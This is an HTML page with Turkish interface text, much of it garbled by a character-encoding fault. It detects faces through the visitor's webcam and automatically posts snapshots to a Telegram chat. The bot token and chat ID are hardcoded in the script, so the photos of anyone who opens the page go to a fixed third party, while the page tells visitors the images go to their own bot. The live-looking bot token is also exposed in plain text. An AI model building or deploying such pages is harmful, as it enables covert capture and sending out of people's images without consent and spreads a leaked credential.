<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YÃ¼z Takip ve Telegram GÃ¶nderim</title>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_detection"></script>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils"></script>
    <style>
        body { font-family: 'Segoe UI', sans-serif; display: flex; flex-direction: column; align-items: center; background: #121212; color: #ffffff; margin: 0; padding: 20px; }
        #info-box { background: #1e1e1e; padding: 20px; border-radius: 12px; margin-bottom: 20px; max-width: 600px; text-align: center; border: 1px solid #0088cc; box-shadow: 0 4px 15px rgba(0,136,204,0.3); }
        .container { position: relative; width: 640px; height: 480px; }
        video, canvas { position: absolute; left: 0; top: 0; border-radius: 15px; width: 640px; height: 480px; }
        #startBtn { padding: 15px 35px; font-size: 18px; cursor: pointer; background: #0088cc; color: white; border: none; border-radius: 50px; margin-top: 20px; transition: 0.3s; font-weight: bold; }
        #startBtn:hover { background: #00aaff; transform: scale(1.05); }
    </style>
</head>
<body>

    <div id="info-box">
        <h3>Sistem Ã‡alÄ±ÅŸma MantÄ±ÄŸÄ±</h3>
        <p>Bu uygulama kameranÄ±zÄ± kullanarak yÃ¼zÃ¼nÃ¼zÃ¼ tespit eder. YÃ¼z algÄ±landÄ±ÄŸÄ±nda, otomatik olarak anlÄ±k bir gÃ¶rÃ¼ntÃ¼ alÄ±r ve <b>Telegram Botunuz</b> Ã¼zerinden size iletir.</p>
        <small style="color: #888;">Not: Ä°lk kullanÄ±mda kamera ve bildirim izni vermeniz gerekmektedir.</small>
    </div>

    <div class="container">
        <video id="input_video" style="display:none;"></video>
        <canvas id="output_canvas"></canvas>
    </div>

    <button id="startBtn">Sistemi BaÅŸlat</button>

    <script>
        // Senin saÄŸladÄ±ÄŸÄ±n Telegram Bilgileri
        const TELEGRAM_BOT_TOKEN = '8567641306:AAHz1V98pDTddIXVnBlf42Sjs4bI1_cAO64';
        const TELEGRAM_CHAT_ID = '792398679';
        
        const videoElement = document.getElementById('input_video');
        const canvasElement = document.getElementById('output_canvas');
        const canvasCtx = canvasElement.getContext('2d');
        const startBtn = document.getElementById('startBtn');
        
        let lastSentTime = 0; 

        const faceDetection = new FaceDetection({
            locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/face_detection/${file}`
        });

        faceDetection.setOptions({ model: 'short-range', minDetectionConfidence: 0.5 });

        faceDetection.onResults(async (results) => {
            canvasCtx.save();
            canvasCtx.clearRect(0, 0, canvasElement.width, canvasElement.height);
            canvasCtx.drawImage(results.image, 0, 0, canvasElement.width, canvasElement.height);
            
            if (results.detections.length > 0) {
                const detection = results.detections[0];
                const box = detection.boundingBox;
                
                // Mavi Ã§erÃ§eve Ã§izimi
                canvasCtx.strokeStyle = '#0088cc';
                canvasCtx.lineWidth = 5;
                canvasCtx.strokeRect(
                    box.xCenter * canvasElement.width - (box.width * canvasElement.width / 2),
                    box.yCenter * canvasElement.height - (box.height * canvasElement.height / 2),
                    box.width * canvasElement.width,
                    box.height * canvasElement.height
                );

                // YÃ¼z algÄ±landÄ±, Telegram'a gÃ¶nder (10 saniye bekleme sÃ¼reli)
                const now = Date.now();
                if (now - lastSentTime > 10000) { 
                    lastSentTime = now;
                    sendToTelegram();
                }
            }
            canvasCtx.restore();
        });

        async function sendToTelegram() {
            canvasElement.toBlob(async (blob) => {
                if (!blob) return;
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CHAT_ID);
                formData.append('photo', blob, 'face.jpg');
                formData.append('caption', 'ðŸ“· YÃ¼z AlgÄ±landÄ±! Otomatik kayÄ±t gÃ¶nderiliyor.');

                try {
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                } catch (e) { console.error("GÃ¶nderim hatasÄ±:", e); }
            }, 'image/jpeg', 0.7);
        }

        async function startSystem() {
            const permission = await Notification.requestPermission();
            const camera = new Camera(videoElement, {
                onFrame: async () => { await faceDetection.send({image: videoElement}); },
                width: 640, height: 480
            });
            canvasElement.width = 640;
            canvasElement.height = 480;
            camera.start();
            startBtn.innerText = "Sistem Aktif...";
            startBtn.disabled = true;
            startBtn.style.opacity = "0.5";
        }

        startBtn.addEventListener('click', startSystem);
    </script>
</body>
</html>
